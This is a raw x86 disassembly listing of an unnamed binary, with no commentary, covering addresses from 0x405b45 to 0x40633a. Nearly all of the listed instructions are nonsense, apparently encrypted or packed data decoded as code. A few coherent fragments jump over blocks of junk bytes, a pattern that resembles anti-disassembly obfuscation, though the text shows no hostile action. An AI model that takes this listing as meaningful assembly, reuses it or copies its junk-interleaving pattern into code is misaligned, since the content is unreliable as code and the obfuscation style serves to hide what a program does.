  405b45:	dec    esp
  405b46:	push   ecx
  405b47:	out    0x9e,al
  405b49:	jl     0x405bc4
  405b4b:	jp     0x405b72
  405b4d:	sub    ebp,ebp
  405b4f:	loopne 0x405b08
  405b51:	and    eax,0xe8877c1
  405b56:	xor    BYTE PTR cs:[eax+edi*1],ch
  405b5a:	in     al,dx
  405b5b:	sbb    DWORD PTR [ecx],0xffffff9d
  405b5e:	ret    0xe9c7
  405b61:	shl    ch,cl
  405b63:	dec    esp
  405b64:	push   0x69
  405b66:	xchg   ebp,eax
  405b67:	pop    esp
  405b68:	cmc    
  405b69:	test   DWORD PTR [esi+eiz*8+0x70572889],edx
  405b70:	div    BYTE PTR [esi+edx*1]
  405b73:	inc    ebp
  405b74:	ja     0x405b0b
  405b76:	dec    ecx
  405b77:	push   ss
  405b78:	push   ecx
  405b79:	xor    al,0xc7
  405b7b:	pop    edi
  405b7c:	ret    0x63f7
  405b7f:	test   ebp,edx
  405b81:	call   0x7168:0x3ce4fce3
  405b88:	popf   
  405b89:	mov    eax,DWORD PTR [ebp-0x14]
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	jmp    0x7e29:0x6027eef2
  405bb2:	jle    0x405c09
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405c23
  405bb8:	pop    ss
  405bb9:	fnsave [eax+0x7adebbc]
  405bbf:	xor    bx,di
  405bc2:	lahf   
  405bc3:	add    esp,DWORD PTR [edx]
  405bc5:	pop    edi
  405bc6:	cmp    al,0xcf
  405bc8:	xchg   eax,ebx
  405bca:	mov    dh,0x27
  405bcc:	and    al,0x35
  405bce:	inc    edi
  405bcf:	mov    ebx,0x138e388a
  405bd4:	retf   0x22b4
  405bd7:	js     0x405b91
  405bd9:	imul   esp,DWORD PTR [ecx+0x2c],0x65
  405bdd:	cli    
  405bde:	sbb    eax,0x62f91d7a
  405be3:	hlt    
  405be4:	leave  
  405be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405be6:	test   DWORD PTR [esi+0x4498d7db],esp
  405bec:	mov    ds:0x3f97fa8,eax
  405bf1:	stos   BYTE PTR es:[edi],al
  405bf2:	outs   dx,DWORD PTR ds:[esi]
  405bf3:	imul   BYTE PTR [esi]
  405bf5:	mov    ah,0x31
  405bf7:	jo     0x405c3a
  405bf9:	or     DWORD PTR [edx],edx
  405bfb:	les    esp,FWORD PTR [esi]
  405bfd:	sub    esi,DWORD PTR [ecx+eiz*8]
  405c00:	stc    
  405c01:	mov    al,ds:0x860828b8
  405c06:	lods   al,BYTE PTR ds:[esi]
  405c07:	iret   
  405c08:	test   bl,0x8e
  405c0b:	(bad)  
  405c0d:	push   ebx
  405c0e:	in     al,dx
  405c0f:	cmp    esp,DWORD PTR [esi]
  405c11:	sbb    ebp,DWORD PTR ds:[edx]
  405c14:	repz adc al,0xb5
  405c17:	outs   dx,DWORD PTR ds:[esi]
  405c18:	mov    bl,0x3f
  405c1a:	xchg   ebp,eax
  405c1b:	push   esi
  405c1d:	mov    esp,0x91be115a
  405c22:	mov    esp,0xd7317d5f
  405c27:	fidiv  WORD PTR [ebx]
  405c29:	aam    0xc3
  405c2b:	inc    ebx
  405c2c:	and    dh,bh
  405c2e:	jecxz  0x405c5a
  405c30:	jg     0x405c26
  405c32:	das    
  405c33:	mov    ebx,0xb4a7f7b
  405c38:	int    0x8d
  405c3a:	mov    dl,BYTE PTR [eax]
  405c3c:	mov    eax,ds:0x56020bdd
  405c41:	loopne 0x405c8f
  405c43:	scas   al,BYTE PTR es:[edi]
  405c44:	sbb    al,0x4
  405c46:	add    BYTE PTR es:[edi-0x2becef9d],bh
  405c4d:	daa    
  405c4e:	loope  0x405cb0
  405c50:	pop    esp
  405c51:	fisttp QWORD PTR ds:0xbfa613f5
  405c57:	aas    
  405c58:	and    dh,BYTE PTR [esi+0x52]
  405c5b:	test   al,0xb7
  405c5d:	jno    0x405c23
  405c5f:	test   al,0xde
  405c61:	div    BYTE PTR [eax-0x27]
  405c64:	das    
  405c65:	(bad)  
  405c66:	fnstsw WORD PTR [ebp+0x1c6c024d]
  405c6c:	iret   
  405c6d:	lods   al,BYTE PTR ds:[esi]
  405c6e:	cs loope 0x405c4e
  405c71:	push   eax
  405c72:	sbb    esp,esi
  405c74:	cdq    
  405c75:	dec    esi
  405c76:	xor    eax,0xbef54eda
  405c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c7c:	lds    ecx,FWORD PTR [eax]
  405c7e:	outs   dx,DWORD PTR ds:[esi]
  405c7f:	inc    esp
  405c80:	stos   DWORD PTR es:[edi],eax
  405c81:	pop    ebp
  405c82:	cli    
  405c83:	sbb    eax,0xa8017d07
  405c88:	iret   
  405c89:	stos   BYTE PTR es:[edi],al
  405c8a:	les    edi,FWORD PTR [eax-0xc5acb52]
  405c90:	cmp    al,0x57
  405c92:	outs   dx,DWORD PTR ds:[esi]
  405c93:	pusha  
  405c94:	adc    al,0x4c
  405c96:	cli    
  405c97:	dec    edi
  405c98:	not    DWORD PTR [edi+0x8c815db]
  405c9e:	mov    esi,0xe7e4eead
  405ca3:	les    ecx,FWORD PTR [edx-0x7a37bf2c]
  405ca9:	xchg   ebp,eax
  405caa:	xor    BYTE PTR [esi+0x7],al
  405cad:	jnp    0x405c3d
  405caf:	cmp    eax,0x8ad2a622
  405cb4:	clc    
  405cb5:	cwde   
  405cb6:	mov    edi,0xe92eecb3
  405cbb:	and    eax,0x3c1e109
  405cc0:	xchg   ebp,eax
  405cc1:	pop    esi
  405cc2:	cli    
  405cc3:	jge    0x405c72
  405cc5:	pop    DWORD PTR [esi+0x17]
  405cc8:	shl    BYTE PTR [eax+0x3c],1
  405ccb:	jno    0x405cbb
  405ccd:	sti    
  405cce:	sub    al,0x61
  405cd0:	or     eax,esi
  405cd2:	aad    0x80
  405cd4:	fwait
  405cd5:	adc    DWORD PTR [eax-0x50],ebx
  405cd8:	in     al,dx
  405cd9:	push   ebp
  405cda:	ret    0xb0c2
  405cdd:	mov    ss,WORD PTR es:[edx+0x67]
  405ce1:	xchg   ebp,eax
  405ce2:	rcl    DWORD PTR gs:[edx+esi*4-0x4],1
  405ce7:	mov    esi,0x5c89091
  405cec:	cmp    ch,BYTE PTR [edx+0x54b8f318]
  405cf2:	jecxz  0x405d4f
  405cf4:	mov    WORD PTR [ebx],?
  405cf6:	adc    DWORD PTR fs:[ecx],esi
  405cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cfa:	lods   al,BYTE PTR ds:[esi]
  405cfb:	add    ebx,DWORD PTR [edi+0x4773aef]
  405d01:	mov    dh,0x66
  405d03:	mov    edi,0xe93786a5
  405d08:	mov    eax,0xac973f4c
  405d0d:	es mov dl,0x8e
  405d10:	sub    edx,ebp
  405d12:	inc    edx
  405d13:	inc    ecx
  405d14:	jge    0x405ce8
  405d16:	mov    gs,WORD PTR [ecx+0x5d]
  405d19:	jnp    0x405cdf
  405d1b:	pop    ebp
  405d1c:	dec    ebx
  405d1d:	pop    esp
  405d1e:	int3   
  405d1f:	jmp    0xfb86:0x71033fb7
  405d26:	mov    al,ds:0x22926a63
  405d2b:	outs   dx,BYTE PTR ds:[esi]
  405d2c:	je     0x405caf
  405d2e:	lea    esi,[eax+0x1ac2d85e]
  405d34:	(bad)  
  405d35:	xor    dh,al
  405d37:	xchg   ebx,eax
  405d38:	dec    edi
  405d39:	std    
  405d3a:	dec    esp
  405d3b:	or     esp,ebp
  405d3d:	mov    dl,0xc7
  405d3f:	and    edi,edx
  405d41:	jl     0x405d4d
  405d43:	mov    ds:0x3cb25d02,eax
  405d48:	mov    WORD PTR [ebx+ecx*8],cs
  405d4b:	mov    esp,0xda06c740
  405d50:	data16 test al,0xe6
  405d53:	imul   ecx,DWORD PTR [edx-0x11],0xffffffd3
  405d57:	sahf   
  405d58:	pop    edi
  405d59:	mov    ch,0x12
  405d5b:	rcr    al,1
  405d5d:	push   edi
  405d5e:	pop    ecx
  405d5f:	imul   edi,DWORD PTR [ebx+0x24c74357],0xffffffba
  405d66:	data16 fisub WORD PTR [eax+edx*8]
  405d6a:	mov    dl,0xc6
  405d6c:	push   ebx
  405d6d:	fdiv   st(7),st
  405d6f:	sbb    si,cx
  405d72:	and    eax,ebp
  405d74:	cwde   
  405d75:	call   0xba3f:0xdcd70558
  405d7c:	mov    esi,0xae4b93e8
  405d81:	es jae 0x405d4d
  405d84:	jge    0x405d64
  405d86:	and    ebp,DWORD PTR [edi-0x4d]
  405d89:	data16 (bad) 
  405d8b:	jnp    0x405d45
  405d8d:	stos   DWORD PTR es:[edi],eax
  405d8e:	call   0x8beeb482
  405d93:	inc    ebp
  405d94:	lock mov eax,DWORD PTR [eax+0x198]
  405d9b:	push   DWORD PTR [eax]
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0xc99c135b,al
  405dbe:	push   edi
  405dbf:	fsub   DWORD PTR [ebx]
  405dc1:	inc    edi
  405dc2:	aaa    
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405e09
  405dca:	jne    0x405d67
  405dcc:	sub    BYTE PTR [edx+0x113458f],cl
  405dd2:	out    dx,al
  405dd3:	call   0xf5eed43d
  405dd8:	sbb    DWORD PTR [edx],esp
  405dda:	sbb    edi,DWORD PTR [ebp-0x23]
  405ddd:	gs arpl bx,bx
  405de0:	push   0x89c4eae4
  405de5:	jb     0x405d92
  405de7:	in     al,0xdf
  405de9:	ret    0x9aac
  405dec:	or     al,0x84
  405dee:	div    BYTE PTR [ebx+0x4cdcce4d]
  405df4:	out    0xf7,al
  405df6:	stos   DWORD PTR es:[edi],eax
  405df7:	mov    al,ds:0xdfb2bafa
  405dfc:	xlat   BYTE PTR ds:[ebx]
  405dfd:	mov    esi,0xb93e233a
  405e02:	sbb    eax,0x61cb3f0
  405e07:	call   DWORD PTR [esp+edi*8+0x217bb242]
  405e0e:	mov    ds:0xbb0f9c42,eax
  405e13:	mov    bl,BYTE PTR [ebx+0x368b196e]
  405e19:	into   
  405e1a:	adc    ebx,esi
  405e1c:	in     eax,dx
  405e1d:	inc    ebx
  405e1e:	cdq    
  405e1f:	adc    esi,DWORD PTR [ebx+edi*2-0x37f7b21]
  405e26:	jae    0x405e0b
  405e28:	rcl    BYTE PTR [eax-0x44d424ff],1
  405e2e:	stos   BYTE PTR es:[edi],al
  405e2f:	xchg   ebp,eax
  405e30:	mov    ecx,0x3aae58d8
  405e35:	test   DWORD PTR [edx-0x46],ebp
  405e38:	dec    esp
  405e39:	adc    bh,BYTE PTR [esi-0x1742efd4]
  405e3f:	ret    0x4f7
  405e42:	or     BYTE PTR [esi+0x1d],dh
  405e45:	out    0xcc,al
  405e47:	cmp    dl,BYTE PTR [edi+edx*1]
  405e4a:	test   eax,0xb5aca0c1
  405e4f:	dec    dh
  405e51:	mov    eax,0x229a236e
  405e56:	sahf   
  405e57:	ret    0xcd7d
  405e5a:	sub    ah,BYTE PTR [ebx+ebx*8-0x7ee2f39b]
  405e61:	jno    0x405de3
  405e63:	xchg   esp,eax
  405e64:	hlt    
  405e65:	inc    ebx
  405e66:	mov    al,fs:0xa4b9618c
  405e6c:	xlat   BYTE PTR ds:[ebx]
  405e6d:	dec    esp
  405e6e:	push   ebp
  405e6f:	add    ebx,ecx
  405e71:	push   eax
  405e72:	(bad)  
  405e73:	(bad)  
  405e74:	mov    bl,0x2b
  405e76:	dec    ebp
  405e77:	rcl    BYTE PTR [ebp-0xe],0xbd
  405e7b:	mov    cl,0xdb
  405e7d:	aad    0x0
  405e7f:	iret   
  405e80:	add    BYTE PTR [esi+0x17],dl
  405e83:	add    esi,DWORD PTR [edi]
  405e85:	mov    esp,0x70dedb58
  405e8a:	mov    cl,0xd3
  405e8c:	and    BYTE PTR [edi],bh
  405e8e:	lahf   
  405e8f:	dec    eax
  405e90:	clc    
  405e91:	(bad)  
  405e93:	adc    cl,BYTE PTR [eax+0x7]
  405e96:	mov    ecx,0x15088d8e
  405e9b:	pop    esp
  405e9c:	inc    eax
  405e9d:	pop    ecx
  405e9e:	adc    BYTE PTR [ebx],bh
  405ea0:	sbb    esp,edi
  405ea2:	icebp  
  405ea3:	xchg   esi,eax
  405ea4:	push   ds
  405ea5:	es mov edx,0xe7539cdb
  405eab:	mov    BYTE PTR [ecx],0xe2
  405eae:	jp     0x405f13
  405eb0:	pop    es
  405eb1:	and    BYTE PTR [edi+0x27bbde1d],ch
  405eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eb8:	cld    
  405eb9:	mov    eax,ds:0xbba05f0b
  405ebe:	test   BYTE PTR [esi-0x56f0f4bc],cl
  405ec4:	pop    esp
  405ec5:	or     DWORD PTR [esi+0x7b],ebp
  405ec8:	ds dec esp
  405eca:	(bad)  
  405ecb:	lahf   
  405ecc:	dec    eax
  405ecd:	stos   BYTE PTR es:[edi],al
  405ece:	and    al,0xac
  405ed0:	aaa    
  405ed1:	in     eax,dx
  405ed2:	mov    ch,0xb8
  405ed4:	push   edx
  405ed5:	jg     0x405f15
  405ed7:	lahf   
  405ed8:	out    0x15,eax
  405eda:	das    
  405edb:	repz leave 
  405edd:	add    DWORD PTR ds:0x4710880f,0xb23f9541
  405ee7:	jle    0x405e76
  405ee9:	adc    eax,0x7d31ce07
  405eee:	ins    DWORD PTR es:[edi],dx
  405eef:	xor    al,0xb8
  405ef1:	data16 xlat BYTE PTR ds:[ebx]
  405ef3:	or     DWORD PTR [ebx],ebp
  405ef5:	mov    edx,DWORD PTR [eax+0xa]
  405ef8:	daa    
  405ef9:	mov    edx,0x8d6ccc22
  405efe:	inc    ebx
  405eff:	push   ds
  405f00:	mov    ds:0x473c52dd,eax
  405f05:	or     DWORD PTR [edi+ebx*1],ecx
  405f08:	mov    dl,0x33
  405f0a:	fst    st(6)
  405f0c:	or     al,0x39
  405f0e:	leave  
  405f0f:	fld    TBYTE PTR [edx]
  405f11:	repnz xor dh,BYTE PTR [ebx+0x16693b7e]
  405f18:	std    
  405f19:	or     al,0xf1
  405f1b:	daa    
  405f1c:	sub    eax,0xa90cddd6
  405f21:	cwde   
  405f22:	cmp    ecx,DWORD PTR [esi]
  405f24:	mov    esi,0x19b812b7
  405f29:	push   ebx
  405f2a:	pop    esp
  405f2b:	fld    QWORD PTR fs:[eax-0x31]
  405f2f:	mov    edi,0x614c468e
  405f34:	xor    al,BYTE PTR [ebp+ebp*4-0xa]
  405f38:	lahf   
  405f39:	inc    ebx
  405f3a:	icebp  
  405f3b:	imul   esi,DWORD PTR [esp+eiz*8-0x23],0x65
  405f40:	in     al,0x12
  405f42:	push   ds
  405f43:	aam    0xf1
  405f45:	bound  ecx,QWORD PTR [ebp-0x52e8904e]
  405f4b:	add    esp,DWORD PTR [ebx+0x65]
  405f4e:	sub    DWORD PTR [ebp+0x32f4f9f7],edx
  405f54:	push   ss
  405f55:	(bad)  
  405f56:	cli    
  405f57:	xchg   ecx,eax
  405f58:	ss pop eax
  405f5a:	out    dx,al
  405f5b:	add    esi,0x97cd183d
  405f61:	test   ch,bh
  405f63:	xchg   esp,eax
  405f64:	inc    edi
  405f65:	inc    esp
  405f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f67:	lock fidiv WORD PTR fs:[ecx+0x37867910]
  405f6f:	retf   
  405f70:	test   DWORD PTR [esi],ebp
  405f72:	xor    al,0xa3
  405f74:	mov    ebp,0xc881a09a
  405f79:	pop    es
  405f7a:	inc    ebp
  405f7b:	adc    DWORD PTR [edi],0xffffff8b
  405f7e:	les    esp,FWORD PTR [eax]
  405f80:	(bad)  
  405f81:	pop    ebp
  405f82:	cmp    bl,BYTE PTR [esi+0x1990f0a6]
  405f88:	push   eax
  405f89:	pushf  
  405f8a:	(bad)  
  405f8b:	fidiv  DWORD PTR [ebp+0x4a]
  405f8e:	test   ecx,ebx
  405f90:	es adc al,0x6e
  405f93:	jae    0x405fc9
  405f95:	add    dl,al
  405f97:	xchg   esp,eax
  405f98:	out    dx,eax
  405f99:	xlat   BYTE PTR ds:[ebx]
  405f9a:	into   
  405f9b:	ins    BYTE PTR es:[edi],dx
  405f9c:	mov    ecx,0xd04b81ab
  405fa1:	leave  
  405fa2:	clc    
  405fa3:	pop    esp
  405fa4:	mov    DWORD PTR [ebp-0x20],eax
  405fa7:	je     0x406a43
  405fad:	jmp    0x4061a5
  405fb2:	jmp    0x405fa8
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx+0x33]
  405fbf:	cmp    esi,DWORD PTR [edx+0x7e359aa4]
  405fc5:	jle    0x40601c
  405fc7:	jg     0x406047
  405fc9:	jle    0x406038
  405fcb:	xchg   ah,ah
  405fcd:	in     al,0xfd
  405fcf:	jb     0x405ff2
  405fd1:	mov    ecx,0xad0b512d
  405fd6:	icebp  
  405fd7:	sub    BYTE PTR [ecx-0x50aab906],bl
  405fdd:	aas    
  405fde:	idiv   ebp
  405fe0:	mov    esi,0x77227e1
  405fe5:	inc    esp
  405fe6:	mov    edx,0xface2068
  405feb:	mov    esi,0xbe5dda45
  405ff1:	test   BYTE PTR [ebp-0x1812fd19],dl
  405ff7:	sbb    edi,eax
  405ff9:	mov    eax,0x1af7da11
  405ffe:	jmp    0xa469:0xe59c180
  406005:	jb     0x406036
  406007:	mov    eax,ds:0x3ee45974
  40600c:	adc    BYTE PTR [ecx-0x681c3715],0xea
  406013:	cmp    BYTE PTR [edx],0x1
  406016:	push   ecx
  406017:	mov    ch,0xd0
  406019:	jle    0x406098
  40601b:	pop    es
  40601c:	stos   DWORD PTR es:[edi],eax
  40601d:	push   esp
  40601e:	mov    edx,0xce1f5cfc
  406023:	xor    cx,WORD PTR [ebx+0x77]
  406027:	ret    
  406028:	mov    ?,WORD PTR [eax]
  40602a:	or     ecx,DWORD PTR [edx+0x7aa21b80]
  406030:	mov    ebp,0x7525d65a
  406035:	call   0xd558:0xea354df4
  40603c:	lahf   
  40603d:	pop    esi
  40603e:	mov    dh,0x21
  406040:	adc    DWORD PTR [esi+0x64],eax
  406043:	sub    dh,BYTE PTR [eax+0x50bcd9d5]
  406049:	ins    DWORD PTR es:[edi],dx
  40604a:	sub    cl,BYTE PTR [edi+0x40]
  40604d:	sbb    BYTE PTR [esi],0x9e
  406050:	sub    eax,0x7ec518c3
  406055:	jge    0x40609c
  406057:	xor    edx,DWORD PTR [esi-0x7aa567a6]
  40605d:	and    eax,0xd7a398e2
  406062:	ins    BYTE PTR es:[edi],dx
  406063:	fucomip st,st(3)
  406065:	push   esp
  406066:	cmp    al,0x3a
  406068:	push   cs
  406069:	bound  edx,QWORD PTR ds:0x742500ff
  40606f:	lahf   
  406070:	mov    esi,0xc8855c31
  406075:	cld    
  406076:	or     bh,BYTE PTR [ebx+esi*2-0x4c]
  40607a:	fbld   TBYTE PTR [eax+0x72]
  40607d:	std    
  40607e:	mov    cl,0xae
  406080:	mov    ebx,DWORD PTR [ebx+0x5b221bf6]
  406086:	repz inc eax
  406088:	out    0x2c,al
  40608a:	stos   DWORD PTR es:[edi],eax
  40608b:	mov    al,ds:0xb49ec2a8
  406090:	push   0xfda7363d
  406095:	ror    BYTE PTR [ebx+0x4454508e],0x32
  40609c:	fcom   QWORD PTR [ebx]
  40609e:	mov    eax,ds:0xce44b258
  4060a3:	jb     0x4060c8
  4060a5:	enter  0xfa8c,0x6f
  4060a9:	aad    0xa8
  4060ab:	cmp    ebp,DWORD PTR [esi+edi*8]
  4060ae:	and    DWORD PTR [ecx+0x4e],esp
  4060b1:	retf   
  4060b2:	popaw  
  4060b4:	xchg   edi,eax
  4060b5:	mov    esp,0x1cae40f3
  4060ba:	pusha  
  4060bb:	pop    esi
  4060bc:	int3   
  4060bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060be:	pop    esi
  4060bf:	add    DWORD PTR [eax+0x4d408aff],eax
  4060c5:	sub    ax,0xf64a
  4060c9:	lock jecxz 0x406075
  4060cc:	sub    BYTE PTR [edi+0x23],dl
  4060cf:	dec    ebx
  4060d0:	xchg   BYTE PTR [eax],bl
  4060d2:	adc    al,BYTE PTR [edi-0x203cc98e]
  4060d8:	shl    BYTE PTR ds:0x43f2b2ea,0x4e
  4060df:	jbe    0x406157
  4060e1:	adc    al,0x63
  4060e3:	xor    DWORD PTR [ebp+0x77],eax
  4060e6:	cld    
  4060e7:	and    al,0x6e
  4060e9:	and    DWORD PTR ds:0x32978271,ebx
  4060ef:	mov    esi,0xeabea7e2
  4060f4:	lea    eax,[ebx-0x72fa97dd]
  4060fa:	clc    
  4060fb:	sti    
  4060fc:	icebp  
  4060fd:	stc    
  4060fe:	jns    0x406135
  406100:	mov    ah,0xd9
  406102:	fstp   QWORD PTR [edx*1+0x66c48b21]
  406109:	mov    ds:0xf51d5bf3,al
  40610e:	sub    eax,DWORD PTR [edx-0x45d983e8]
  406114:	ret    0xf5d4
  406117:	xor    cl,BYTE PTR [eax]
  406119:	imul   edi,DWORD PTR [edx+0x248b8e16],0xfffffffd
  406120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406121:	push   0xf2c93759
  406126:	xchg   dl,bh
  406128:	fstp   TBYTE PTR [edx]
  40612a:	sub    eax,0x29adf6dd
  40612f:	xor    eax,0x4586592b
  406134:	mov    ds:0xc8c6eeb2,eax
  406139:	mov    esp,0x6c4253b
  40613e:	pop    esp
  40613f:	clc    
  406140:	jge    0x406174
  406142:	scas   al,BYTE PTR es:[edi]
  406143:	add    esi,0x421f9977
  406149:	mov    edx,0x9cfa1bb2
  40614e:	shl    cl,1
  406150:	or     ebx,0x606192a9
  406156:	int3   
  406157:	inc    ebx
  406158:	lds    ecx,FWORD PTR [ebx+eax*8-0x44]
  40615c:	dec    ebx
  40615d:	jae    0x4061b2
  40615f:	repnz inc ecx
  406161:	retf   
  406162:	inc    ebx
  406163:	shr    BYTE PTR [eax-0x35],0xbd
  406167:	xor    ebx,0xffffffdc
  40616a:	scas   eax,DWORD PTR es:[edi]
  40616b:	or     al,0x30
  40616d:	mov    bl,0xc3
  40616f:	js     0x406152
  406171:	mov    esp,0x3fb69c5d
  406176:	fsub   DWORD PTR [eax]
  406178:	loop   0x40616d
  40617a:	stos   BYTE PTR es:[edi],al
  40617b:	sub    dl,dh
  40617d:	adc    edi,0x9ed49d50
  406183:	nop
  406184:	enter  0x3427,0x1
  406188:	xor    eax,0xa258fbf8
  40618d:	cmp    ch,dh
  40618f:	shl    BYTE PTR [edi+0x38c5812b],1
  406195:	inc    esp
  406196:	jp     0x40612d
  406198:	ret    
  406199:	pop    ss
  40619a:	in     eax,0xb
  40619c:	into   
  40619d:	sahf   
  40619e:	or     bl,BYTE PTR [eax]
  4061a0:	pop    edi
  4061a1:	lods   al,BYTE PTR ds:[esi]
  4061a2:	mov    ebx,0x458d1610
  4061a7:	call   0xd485ecfc
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	pop    ebp
  4061d2:	(bad)  
  4061d3:	pop    edi
  4061d4:	xor    esi,ecx
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x40624e
  4061de:	loope  0x4061bc
  4061e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061e1:	dec    ebp
  4061e2:	cmc    
  4061e3:	loop   0x40625b
  4061e5:	or     ebp,ecx
  4061e7:	sbb    dh,dh
  4061e9:	or     al,0x5c
  4061eb:	sbb    esi,DWORD PTR [eax]
  4061ed:	lahf   
  4061ee:	sti    
  4061ef:	loop   0x40617f
  4061f1:	mov    eax,0xb287f6d8
  4061f6:	dec    esp
  4061f7:	test   ecx,0x5bda5b29
  4061fd:	addr16 in al,dx
  4061ff:	jecxz  0x4061cb
  406201:	loope  0x40618e
  406203:	or     al,0x15
  406205:	(bad)  
  406207:	and    cl,BYTE PTR [edx+0x1c]
  40620a:	daa    
  40620b:	(bad)  
  40620c:	cld    
  40620d:	dec    ecx
  40620e:	and    DWORD PTR [eax],ecx
  406210:	fadd   QWORD PTR [ecx+0x46]
  406213:	and    cl,BYTE PTR [ecx-0x6c]
  406216:	fcom   DWORD PTR [esi]
  406218:	sub    DWORD PTR [edi+0x46],0x15
  40621c:	push   esp
  40621d:	cmp    DWORD PTR [eax+0x643fd1bc],ecx
  406223:	or     al,dh
  406225:	pop    eax
  406226:	cmp    al,0xbf
  406228:	mov    bh,0xff
  40622a:	mov    esi,0xaf9d28c5
  40622f:	out    dx,al
  406230:	cdq    
  406231:	jo     0x4061d5
  406233:	mov    edi,0x97962d6f
  406238:	pop    ecx
  406239:	mov    ebp,0xfe3ca146
  40623e:	adc    BYTE PTR [ecx+0x2a656d0c],0x1f
  406245:	imul   edx,ebp,0x25940544
  40624b:	mov    dl,0x38
  40624d:	dec    ebp
  40624e:	xchg   ebp,eax
  40624f:	call   0x856a6fd2
  406254:	imul   DWORD PTR [esi-0x36]
  406257:	mov    edx,0x26dbc4d9
  40625c:	mov    al,0x16
  40625e:	jmp    0x3ee22670
  406263:	shl    BYTE PTR [eax-0x53dc5b37],cl
  406269:	xchg   BYTE PTR [eax],ch
  40626b:	fld    DWORD PTR [ecx+ebp*8]
  40626e:	cmp    al,0xd7
  406270:	mov    al,ds:0x94d34163
  406275:	(bad)  
  406276:	ret    
  406277:	sbb    BYTE PTR [edi],dh
  406279:	je     0x4062e4
  40627b:	or     al,0xcb
  40627e:	in     al,dx
  40627f:	data16 rcr BYTE PTR [edi-0x42],cl
  406283:	test   eax,0xb3b5e9c1
  406288:	pop    ebp
  406289:	fxch   st(7)
  40628b:	je     0x406281
  40628d:	in     al,dx
  40628e:	out    0xa5,al
  406290:	dec    eax
  406291:	lock inc ebx
  406293:	and    BYTE PTR [eax+0x4f59e157],dh
  406299:	push   ss
  40629a:	mov    cl,0x51
  40629c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40629d:	mov    ah,0x14
  40629f:	mov    edi,0x97a17099
  4062a4:	pop    esi
  4062a5:	sar    DWORD PTR [edi+edx*8+0x57cad4e2],1
  4062ac:	push   ebx
  4062ad:	inc    eax
  4062ae:	push   ebp
  4062af:	and    BYTE PTR [eax+ecx*4-0x75],bl
  4062b3:	pop    eax
  4062b4:	lods   al,BYTE PTR ds:[esi]
  4062b5:	cmp    BYTE PTR [edi],bl
  4062b7:	xchg   ecx,eax
  4062b8:	out    0xab,eax
  4062ba:	pop    es
  4062bb:	mov    cs,ebx
  4062bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062be:	in     eax,dx
  4062bf:	push   edx
  4062c0:	stos   BYTE PTR es:[edi],al
  4062c1:	gs imul edx,edi,0x8e7d304
  4062c8:	fwait
  4062c9:	lods   eax,DWORD PTR ds:[esi]
  4062ca:	shl    DWORD PTR [ebx+ecx*2-0x23],1
  4062ce:	pcmpeqb mm4,QWORD PTR [ecx+0x2fc2fef1]
  4062d5:	xor    eax,0xc6094676
  4062da:	dec    edi
  4062db:	inc    esi
  4062dc:	adc    eax,0x2be5cc58
  4062e1:	pop    ebx
  4062e2:	jg     0x4062c6
  4062e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062e5:	push   ss
  4062e6:	pop    esp
  4062e7:	dec    edx
  4062e8:	cmp    eax,0x4563f818
  4062ed:	iret   
  4062ee:	sub    ebx,eax
  4062f0:	inc    ebx
  4062f1:	mov    al,0x7f
  4062f3:	sbb    dl,bh
  4062f5:	sub    cl,BYTE PTR [esi+ebx*4]
  4062f8:	inc    esi
  4062f9:	mov    bl,0xdb
  4062fb:	push   cs
  4062fc:	fidiv  DWORD PTR [esi+0x7]
  4062ff:	xor    BYTE PTR [edi+edi*1-0x3e4c753f],bh
  406306:	pop    es
  406307:	std    
  406308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406309:	call   0x1f57:0x97458761
  406310:	stc    
  406311:	ret    0xf212
  406314:	jnp    0x4062d6
  406316:	mov    es,WORD PTR [edx+esi*8+0x4acc13b0]
  40631d:	call   0xd379d7ba
  406322:	jmp    0x129bc7c8
  406327:	ins    BYTE PTR es:[edi],dx
  406328:	inc    ecx
  406329:	test   DWORD PTR [edi],0xd6212916
  40632f:	in     al,dx
  406330:	sbb    edi,DWORD PTR [esi+esi*1]
  406333:	xchg   BYTE PTR [esi],dl
  406335:	pop    ecx
  406336:	and    al,0x58
  406338:	in     al,dx
  406339:	pop    es
  40633a:	mov    si,0x3654
